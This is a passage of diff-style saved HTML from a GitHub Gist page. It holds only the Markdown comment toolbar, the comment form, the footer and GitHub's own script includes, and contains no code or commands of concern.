+      <svg class="octicon octicon-heading" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.75 2a.75.75 0 01.75.75V7h7V2.75a.75.75 0 011.5 0v10.5a.75.75 0 01-1.5 0V8.5h-7v4.75a.75.75 0 01-1.5 0V2.75A.75.75 0 013.75 2z"></path></svg>
+    </md-header>
+
+    <md-bold tabindex="-1" class="toolbar-item tooltipped tooltipped-n mx-1 js-modifier-label-key" aria-label="Add bold text <ctrl+b>" data-ga-click="Markdown Toolbar, click, bold">
+      <svg class="octicon octicon-bold" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 2a1 1 0 00-1 1v10a1 1 0 001 1h5.5a3.5 3.5 0 001.852-6.47A3.5 3.5 0 008.5 2H4zm4.5 5a1.5 1.5 0 100-3H5v3h3.5zM5 9v3h4.5a1.5 1.5 0 000-3H5z"></path></svg>
+    </md-bold>
+
+    <md-italic tabindex="-1" class="toolbar-item tooltipped tooltipped-n mx-1 js-modifier-label-key" aria-label="Add italic text <ctrl+i>" data-ga-click="Markdown Toolbar, click, italic">
+      <svg class="octicon octicon-italic" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M6 2.75A.75.75 0 016.75 2h6.5a.75.75 0 010 1.5h-2.505l-3.858 9H9.25a.75.75 0 010 1.5h-6.5a.75.75 0 010-1.5h2.505l3.858-9H6.75A.75.75 0 016 2.75z"></path></svg>
+    </md-italic>
+  </div>
+
+  <div class="d-flex d-md-inline-block mr-0 mr-md-3">
+    <md-quote tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 p-md-1 mx-1" aria-label="Insert a quote" data-ga-click="Markdown Toolbar, click, quote">
+      <svg class="octicon octicon-quote" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M1.75 2.5a.75.75 0 000 1.5h10.5a.75.75 0 000-1.5H1.75zm4 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM2.5 7.75a.75.75 0 00-1.5 0v6a.75.75 0 001.5 0v-6z"></path></svg>
+    </md-quote>
+
+    <md-code tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 p-md-1 mx-1" aria-label="Insert code" data-ga-click="Markdown Toolbar, click, code">
+      <svg class="octicon octicon-code" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4.72 3.22a.75.75 0 011.06 1.06L2.06 8l3.72 3.72a.75.75 0 11-1.06 1.06L.47 8.53a.75.75 0 010-1.06l4.25-4.25zm6.56 0a.75.75 0 10-1.06 1.06L13.94 8l-3.72 3.72a.75.75 0 101.06 1.06l4.25-4.25a.75.75 0 000-1.06l-4.25-4.25z"></path></svg>
+    </md-code>
+
+    <button type="button" data-md-button tabindex="-1" class="toolbar-item text-center menu-target p-2 mx-1 d-md-none js-markdown-link-button" aria-label="Add a link" data-ga-click="Markdown Toolbar, click, saved reply">
+      <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg>
+    </button>
+
+    <template class="js-markdown-link-dialog">
+      <div class="Box-header">
+        <h3 class="Box-title">Insert Link</h3>
+      </div>
+      <div class="Box-body overflow-auto">
+        <div>
+          <label class="d-block mb-1" for="js-dialog-link-text">Link Text</label>
+          <input type="text" class="mb-3 form-control input-block" id="js-dialog-link-text" autofocus>
+        </div>
+        <div>
+          <label class="d-block mb-1" for="js-dialog-link-href">URL</label>
+          <input type="url" class="mb-3 form-control input-block" id="js-dialog-link-href">
+        </div>
+        <div class="pt-3 border-top">
+          <button
+            type="button"
+            class="btn btn-primary btn-block js-markdown-link-insert"
+            data-close-dialog
+            data-for-textarea="new_comment_field"
+          >
+            Add
+          </button>
+        </div>
+      </div>
+    </template>
+
+    <md-link tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 p-md-1 d-none d-md-block mx-1 js-modifier-label-key" aria-label="Add a link <ctrl+k>" data-ga-click="Markdown Toolbar, click, link">
+      <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg>
+    </md-link>
+  </div>
+
+  <div class="d-none d-md-inline-block mr-3">
+    <md-unordered-list tabindex="-1" class="toolbar-item tooltipped tooltipped-n mx-1" aria-label="Add a bulleted list" data-ga-click="Markdown Toolbar, click, unordered list">
+      <svg class="octicon octicon-list-unordered" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path></svg>
+    </md-unordered-list>
+
+    <md-ordered-list tabindex="-1" class="toolbar-item tooltipped tooltipped-n mx-1" aria-label="Add a numbered list" data-ga-click="Markdown Toolbar, click, ordered list">
+      <svg class="octicon octicon-list-ordered" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2.003 2.5a.5.5 0 00-.723-.447l-1.003.5a.5.5 0 00.446.895l.28-.14V6H.5a.5.5 0 000 1h2.006a.5.5 0 100-1h-.503V2.5zM5 3.25a.75.75 0 01.75-.75h8.5a.75.75 0 010 1.5h-8.5A.75.75 0 015 3.25zm0 5a.75.75 0 01.75-.75h8.5a.75.75 0 010 1.5h-8.5A.75.75 0 015 8.25zm0 5a.75.75 0 01.75-.75h8.5a.75.75 0 010 1.5h-8.5a.75.75 0 01-.75-.75zM.924 10.32l.003-.004a.851.851 0 01.144-.153A.66.66 0 011.5 10c.195 0 .306.068.374.146a.57.57 0 01.128.376c0 .453-.269.682-.8 1.078l-.035.025C.692 11.98 0 12.495 0 13.5a.5.5 0 00.5.5h2.003a.5.5 0 000-1H1.146c.132-.197.351-.372.654-.597l.047-.035c.47-.35 1.156-.858 1.156-1.845 0-.365-.118-.744-.377-1.038-.268-.303-.658-.484-1.126-.484-.48 0-.84.202-1.068.392a1.858 1.858 0 00-.348.384l-.007.011-.002.004-.001.002-.001.001a.5.5 0 00.851.525zM.5 10.055l-.427-.26.427.26z"></path></svg>
+    </md-ordered-list>
+
+    <md-task-list tabindex="-1" class="toolbar-item tooltipped tooltipped-n mx-1" aria-label="Add a task list" data-ga-click="Markdown Toolbar, click, task list">
+      <svg class="octicon octicon-tasklist" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2.5 2.75a.25.25 0 01.25-.25h10.5a.25.25 0 01.25.25v10.5a.25.25 0 01-.25.25H2.75a.25.25 0 01-.25-.25V2.75zM2.75 1A1.75 1.75 0 001 2.75v10.5c0 .966.784 1.75 1.75 1.75h10.5A1.75 1.75 0 0015 13.25V2.75A1.75 1.75 0 0013.25 1H2.75zm9.03 5.28a.75.75 0 00-1.06-1.06L6.75 9.19 5.28 7.72a.75.75 0 00-1.06 1.06l2 2a.75.75 0 001.06 0l4.5-4.5z"></path></svg>
+    </md-task-list>
+  </div>
+
+      <div  class="d-flex d-md-inline-block">
+      <md-mention tabindex="-1" class="flex-auto text-center toolbar-item tooltipped tooltipped-nw p-2 p-md-1 mx-1" aria-label="Directly mention a user or team" data-ga-click="Markdown Toolbar, click, mention">
+        <svg class="octicon octicon-mention" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4.75 2.37a6.5 6.5 0 006.5 11.26.75.75 0 01.75 1.298 8 8 0 113.994-7.273.754.754 0 01.006.095v1.5a2.75 2.75 0 01-5.072 1.475A4 4 0 1112 8v1.25a1.25 1.25 0 002.5 0V7.867a6.5 6.5 0 00-9.75-5.496V2.37zM10.5 8a2.5 2.5 0 10-5 0 2.5 2.5 0 005 0z"></path></svg>
+      </md-mention>
+
+      <label for="fc-new_comment_field" data-md-button tabindex="-1"  class="d-block d-md-none btn-link flex-auto text-center toolbar-item tooltipped tooltipped-nw p-2 mx-1" aria-label="Attach an image">
+        <svg class="octicon octicon-image" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M1.75 2.5a.25.25 0 00-.25.25v10.5c0 .138.112.25.25.25h.94a.76.76 0 01.03-.03l6.077-6.078a1.75 1.75 0 012.412-.06L14.5 10.31V2.75a.25.25 0 00-.25-.25H1.75zm12.5 11H4.81l5.048-5.047a.25.25 0 01.344-.009l4.298 3.889v.917a.25.25 0 01-.25.25zm1.75-.25V2.75A1.75 1.75 0 0014.25 1H1.75A1.75 1.75 0 000 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0016 13.25zM5.5 6a.5.5 0 11-1 0 .5.5 0 011 0zM7 6a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+      </label>
+
+      <md-ref tabindex="-1" class="flex-auto text-center toolbar-item tooltipped tooltipped-nw p-2 p-md-1 mx-1" aria-label="Reference an issue or pull request" data-ga-click="Markdown Toolbar, click, reference">
+        <svg class="octicon octicon-cross-reference" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M16 1.25v4.146a.25.25 0 01-.427.177L14.03 4.03l-3.75 3.75a.75.75 0 11-1.06-1.06l3.75-3.75-1.543-1.543A.25.25 0 0111.604 1h4.146a.25.25 0 01.25.25zM2.75 3.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h2a.75.75 0 01.75.75v2.19l2.72-2.72a.75.75 0 01.53-.22h4.5a.25.25 0 00.25-.25v-2.5a.75.75 0 111.5 0v2.5A1.75 1.75 0 0113.25 13H9.06l-2.573 2.573A1.457 1.457 0 014 14.543V13H2.75A1.75 1.75 0 011 11.25v-7.5C1 2.784 1.784 2 2.75 2h5.5a.75.75 0 010 1.5h-5.5z"></path></svg>
+      </md-ref>
+
+    </div>
+
+
+  <div class="Details-content--hidden d-block d-md-none width-full">
+    <md-header tabindex="-1" class="toolbar-item tooltipped tooltipped-ne py-2 pr-2 pl-1 mr-1" aria-label="Add header text" data-ga-click="Markdown Toolbar, click, header">
+      <svg class="octicon octicon-heading" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.75 2a.75.75 0 01.75.75V7h7V2.75a.75.75 0 011.5 0v10.5a.75.75 0 01-1.5 0V8.5h-7v4.75a.75.75 0 01-1.5 0V2.75A.75.75 0 013.75 2z"></path></svg>
+    </md-header>
+
+    <md-bold tabindex="-1" class="toolbar-item tooltipped tooltipped-ne p-2 mx-1 js-modifier-label-key" aria-label="Add bold text <ctrl+b>" data-ga-click="Markdown Toolbar, click, bold">
+      <svg class="octicon octicon-bold" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 2a1 1 0 00-1 1v10a1 1 0 001 1h5.5a3.5 3.5 0 001.852-6.47A3.5 3.5 0 008.5 2H4zm4.5 5a1.5 1.5 0 100-3H5v3h3.5zM5 9v3h4.5a1.5 1.5 0 000-3H5z"></path></svg>
+    </md-bold>
+
+    <md-italic tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 mx-1 js-modifier-label-key" aria-label="Add italic text <ctrl+i>" data-ga-click="Markdown Toolbar, click, italic">
+      <svg class="octicon octicon-italic" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M6 2.75A.75.75 0 016.75 2h6.5a.75.75 0 010 1.5h-2.505l-3.858 9H9.25a.75.75 0 010 1.5h-6.5a.75.75 0 010-1.5h2.505l3.858-9H6.75A.75.75 0 016 2.75z"></path></svg>
+    </md-italic>
+
+    <md-unordered-list tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 mx-1" aria-label="Add a bulleted list" data-ga-click="Markdown Toolbar, click, unordered list">
+      <svg class="octicon octicon-list-unordered" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path></svg>
+    </md-unordered-list>
+
+    <md-ordered-list tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 mx-1" aria-label="Add a numbered list" data-ga-click="Markdown Toolbar, click, ordered list">
+      <svg class="octicon octicon-list-ordered" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2.003 2.5a.5.5 0 00-.723-.447l-1.003.5a.5.5 0 00.446.895l.28-.14V6H.5a.5.5 0 000 1h2.006a.5.5 0 100-1h-.503V2.5zM5 3.25a.75.75 0 01.75-.75h8.5a.75.75 0 010 1.5h-8.5A.75.75 0 015 3.25zm0 5a.75.75 0 01.75-.75h8.5a.75.75 0 010 1.5h-8.5A.75.75 0 015 8.25zm0 5a.75.75 0 01.75-.75h8.5a.75.75 0 010 1.5h-8.5a.75.75 0 01-.75-.75zM.924 10.32l.003-.004a.851.851 0 01.144-.153A.66.66 0 011.5 10c.195 0 .306.068.374.146a.57.57 0 01.128.376c0 .453-.269.682-.8 1.078l-.035.025C.692 11.98 0 12.495 0 13.5a.5.5 0 00.5.5h2.003a.5.5 0 000-1H1.146c.132-.197.351-.372.654-.597l.047-.035c.47-.35 1.156-.858 1.156-1.845 0-.365-.118-.744-.377-1.038-.268-.303-.658-.484-1.126-.484-.48 0-.84.202-1.068.392a1.858 1.858 0 00-.348.384l-.007.011-.002.004-.001.002-.001.001a.5.5 0 00.851.525zM.5 10.055l-.427-.26.427.26z"></path></svg>
+    </md-ordered-list>
+
+    <md-task-list tabindex="-1" class="toolbar-item tooltipped tooltipped-n p-2 mx-1" aria-label="Add a task list" data-ga-click="Markdown Toolbar, click, task list">
+      <svg class="octicon octicon-tasklist" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2.5 2.75a.25.25 0 01.25-.25h10.5a.25.25 0 01.25.25v10.5a.25.25 0 01-.25.25H2.75a.25.25 0 01-.25-.25V2.75zM2.75 1A1.75 1.75 0 001 2.75v10.5c0 .966.784 1.75 1.75 1.75h10.5A1.75 1.75 0 0015 13.25V2.75A1.75 1.75 0 0013.25 1H2.75zm9.03 5.28a.75.75 0 00-1.06-1.06L6.75 9.19 5.28 7.72a.75.75 0 00-1.06 1.06l2 2a.75.75 0 001.06 0l4.5-4.5z"></path></svg>
+    </md-task-list>
+  </div>
+</markdown-toolbar>
+
+  </div>
+
+  <div class="comment-form-error js-comment-form-error" role="alert" hidden>
+    There was an error creating your Gist.
+  </div>
+
+  <file-attachment class="js-upload-markdown-image is-default" input="fc-new_comment_field" role="tabpanel" data-tab-container-no-tabstop="true" data-upload-policy-url="/upload/policies/assets"><input type="hidden" value="oXWDHZ4Xg1xixDDAZMzQxAb4uAH1F/Ah6gaubSYZQAIfKOr+hHtOyLNjCPHYEVikRkT9ophSFzqqinDjqBRPhQ==" data-csrf="true" class="js-data-upload-policy-url-csrf" />
+    <div class="write-content js-write-bucket tooltipped tooltipped-ne tooltipped-no-delay tooltipped-align-left-1 hide-reaction-suggestion upload-enabled mx-0 mt-2 mb-2 mx-md-2 hx_sm-hide-drag-drop" >
+
+
+      <text-expander
+        keys=":"
+        data-emoji-url="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/suggestions"
+        >
+        <textarea name="comment[body]"
+                  id="new_comment_field"
+                  
+                  
+                  placeholder="Leave a comment"
+                  aria-label="Comment body"
+                  
+                  class="form-control input-contrast comment-form-textarea js-comment-field js-paste-markdown js-task-list-field js-quick-submit js-size-to-fit js-session-resumable "
+                  ></textarea>
+      </text-expander>
+        
+  <label class="text-normal drag-and-drop hx_drag-and-drop position-relative d-flex flex-justify-between">
+    <input accept=".gif,.jpeg,.jpg,.png" type="file"
+      multiple
+      class="manual-file-chooser manual-file-chooser-transparent top-0 right-0 bottom-0 left-0 width-full ml-0 form-control"
+        id="fc-new_comment_field"
+      >
+    <span class="bg-gray-light position-absolute top-0 left-0 width-full height-full rounded-1" style="pointer-events: none;"></span>
+    <span class="position-relative pr-2" style="pointer-events: none;">
+      <span class="default">
+        Attach files by dragging &amp; dropping, selecting or pasting them.
+      </span>
+      <span class="loading">
+        <img alt="" width="16" height="16" src="https://github.githubassets.com/images/spinners/octocat-spinner-32.gif" /> Uploading your files…
+      </span>
+      <span class="error bad-file">
+        We don’t support that file type.
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again</span> with a
+          GIF, JPEG, JPG or PNG.
+        </span>
+      </span>
+      <span class="error bad-permissions">
+        Attaching documents requires write permission to this repository.
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again</span> with a GIF, JPEG, JPG or PNG.
+        </span>
+      </span>
+      <span class="error repository-required">
+        We don’t support that file type.
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again</span> with a GIF, JPEG, JPG or PNG.
+        </span>
+      </span>
+      <span class="error too-big">
+        Yowza, that’s a big file
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again</span> with a file smaller than 10MB.
+        </span>
+      </span>
+      <span class="error empty">
+        This file is empty.
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again</span> with a file that’s not empty.
+        </span>
+      </span>
+      <span class="error hidden-file">
+        This file is hidden.
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again</span> with another file.
+        </span>
+      </span>
+      <span class="error failed-request">
+        Something went really wrong, and we can’t process that file.
+        <span class="drag-and-drop-error-info">
+          <span class="btn-link">Try again.</span>
+        </span>
+      </span>
+    </span>
+    <span class="tooltipped tooltipped-nw" aria-label="Styling with Markdown is supported">
+      <a
+        class="muted-link position-relative d-inline"
+        href="https://guides.github.com/features/mastering-markdown/"
+        target="_blank"
+        data-ga-click="Markdown Toolbar, click, help"
+        aria-label="Learn about styling with Markdown"
+        
+      >
+        <svg class="octicon octicon-markdown v-align-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z"></path></svg>
+      </a>
+    </span>
+  </label>
+
+    </div>
+</file-attachment>
+  <div role="tabpanel" class="js-preview-panel overflow-auto border-bottom mx-0 my-3 mx-md-2 mb-md-2" hidden>
+    <input type="hidden" name="path" value="" class="js-path">
+    <input type="hidden" name="line" value="" class="js-line-number">
+    <input type="hidden" name="start_line" value="" class="js-start-line-number">
+    <input type="hidden" name="preview_side" value="" class="js-side">
+    <input type="hidden" name="preview_start_side" value="" class="js-start-side">
+    <input type="hidden" name="start_commit_oid" value="" class="js-start-commit-oid">
+    <input type="hidden" name="end_commit_oid" value="" class="js-end-commit-oid">
+    <input type="hidden" name="base_commit_oid" value="" class="js-base-commit-oid">
+    <input type="hidden" name="comment_id" value="" class="js-comment-id">
+    <div class="comment js-suggested-changes-container" data-thread-side="">
+  <div class="comment-body markdown-body js-preview-body" >
+    <p>Nothing to preview</p>
+  </div>
+</div>
+
+  </div>
+
+
+
+  <div class="comment-form-error mb-2 js-comment-update-error" hidden></div>
+</tab-container>
+
+      <input type="text" name="required_field_7f6b" hidden="hidden" class="form-control" /><input type="hidden" name="timestamp" value="1602533532122" class="form-control" /><input type="hidden" name="timestamp_secret" value="8d4eaece3a38fc0308ee02b530ab1ff0238205a0d46f80f141744c5f67655cc9" class="form-control" />
+      <div class="pr-0 pr-md-2 form-actions">
+        <div id="partial-new-comment-form-actions">
+  <button type="submit" class="btn btn-primary" data-disable-with data-disable-invalid>
+    Comment
+  </button>
+</div>
+
+      </div>
+    </div>
+</form></div>
+
+        </div>
+      </div>
+    </div>
+</div>
+  </div>
+</div><!-- /.container -->
+
+    </main>
+  </div>
+
+  </div>
+
+        
+<div class="footer container-lg width-full p-responsive" role="contentinfo">
+    <div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+      <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://github.com">
+        <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+</a>
+      <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+        <li class="mr-3 mr-lg-0">&copy; 2020 GitHub, Inc.</li>
+          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to terms, text:terms" href="https://github.com/site/terms">Terms</a></li>
+          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to privacy, text:privacy" href="https://github.com/site/privacy">Privacy</a></li>
+            <li class="js-cookie-consent-preferences-link-container mr-3 mr-lg-0" hidden="hidden">
+  <button data-ga-click="Footer, go to cookie preferences, text:cookie preferences" class="btn-link js-cookie-consent-preferences-link" type="button">Cookie Preferences</button>
+</li>
+          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to security, text:security" href="https://github.com/security">Security</a></li>
+          <li class="mr-3 mr-lg-0"><a href="https://githubstatus.com/" data-ga-click="Footer, go to status, text:status">Status</a></li>
+          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to help, text:help" href="https://docs.github.com">Help</a></li>
+          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
+          <li class="mr-3 mr-lg-0"><a href="https://github.com/pricing" data-ga-click="Footer, go to Pricing, text:Pricing">Pricing</a></li>
+        <li class="mr-3 mr-lg-0"><a href="https://docs.github.com" data-ga-click="Footer, go to api, text:api">API</a></li>
+        <li class="mr-3 mr-lg-0"><a href="https://services.github.com" data-ga-click="Footer, go to training, text:training">Training</a></li>
+          <li class="mr-3 mr-lg-0"><a href="https://github.blog" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>
+          <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to about, text:about" href="https://github.com/about">About</a></li>
+      </ul>
+    </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+</div>
+
+
+
+  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
+    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
+    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
+    </button>
+    You can’t perform that action at this time.
+  </div>
+
+
+    <script crossorigin="anonymous" async="async" integrity="sha512-O8GTqkyR57l/sxhU8bdDyhNYweSdc6TzDwJ7JvY4SJpZye2+L5ayXb5dDiHo45PLT+boMpfMts4kmDzwuv6ZBQ==" type="application/javascript" id="js-conditional-compat" data-src="https://github.githubassets.com/assets/compat-3bc193aa.js"></script>
+    <script crossorigin="anonymous" integrity="sha512-qBeyRIjDR3DFKTE2D3j4NncHH72scmqyompBxHHrg7D5+rWW8q2xTxXbF7Z2g8Jx7UNpXfM+3R/FVU0SLgFrgw==" type="application/javascript" src="https://github.githubassets.com/assets/environment-a817b244.js"></script>
+    <script crossorigin="anonymous" async="async" integrity="sha512-A92r+ugaVBSfAqxAowqXb3Ob3aLzxKzyKWdn631LQWLnDyc+BAxOn1ga9GFlXdb9fxYenTyHyvCgYq4MzFW/pQ==" type="application/javascript" src="https://github.githubassets.com/assets/vendor-03ddabfa.js"></script>
+    <script crossorigin="anonymous" async="async" integrity="sha512-ogHXrHm/EOH5B1NY0vTPmTEh0VjSIR+l3a6ZCwbTSDysQ8NyH5T5GLdCEuW/KVnuS85Xh7bXyM+QolgGbkFLoA==" type="application/javascript" src="https://github.githubassets.com/assets/frameworks-a201d7ac.js"></script>
+    
+    <script crossorigin="anonymous" async="async" integrity="sha512-ewxYAfGOC2JtOLgVSW3f1MRUZg1R2oeyFOoIxlycWt02TbE2kbLyUwrPczp8h6ZgKdxxElGcMvnPBRj83NycYA==" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-7b0c5801.js"></script>
+    
+      <script crossorigin="anonymous" async="async" integrity="sha512-RszHIHnndPaGg3NOiAwqnXVqUjh0w5UcxXlbyz2lr3Wc39TWJs7X0JCzeFjpZlnojNSJHe8zLG0UTuk1AR+CBA==" type="application/javascript" data-module-id="./contributions-spider-graph.js" data-src="https://github.githubassets.com/assets/contributions-spider-graph-46ccc720.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-bzgw90+7V7ytCzBrH1OT+chKUuZWnShU34Nj8j4NsUAlBHcwWJZe7drP7Uyhu6LfWRcnyk2s2K6XN8dtHO7Xxg==" type="application/javascript" data-module-id="./drag-drop.js" data-src="https://github.githubassets.com/assets/drag-drop-6f3830f7.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-3ns7NIU6EybySZNjVJj+80iQpQuKE5P/913dcTyjpKiCUroOM00uwvpOf/vWvNfZPq90YU9tHxsOing+P+Up0w==" type="application/javascript" data-module-id="./jump-to.js" data-src="https://github.githubassets.com/assets/jump-to-de7b3b34.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-7mITT1qdYmI511H3C9gYUrNP6rZpd+jr9UfoQpluc2rM8dDUxvoOxb7MoxQGp450Gv5OV2J33Q962eio62OSTw==" type="application/javascript" data-module-id="./profile-pins-element.js" data-src="https://github.githubassets.com/assets/profile-pins-element-ee62134f.js"></script>
